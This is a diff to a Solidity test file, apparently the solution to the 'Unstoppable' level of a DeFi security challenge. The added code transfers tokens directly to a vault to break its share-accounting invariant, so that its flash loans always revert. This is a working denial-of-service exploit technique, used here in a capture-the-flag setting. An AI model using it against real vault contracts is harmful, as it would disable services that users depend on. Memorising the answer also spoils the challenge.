@@ -91,7 +91,10 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        // Attack: directly transfer tokens to vault, bypassing deposit() function
+        // This breaks the invariant: actual balance != ERC4626 shares accounting
+        // Causing flashLoan() to revert on InvalidBalance check
+        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
     }
 
     /**
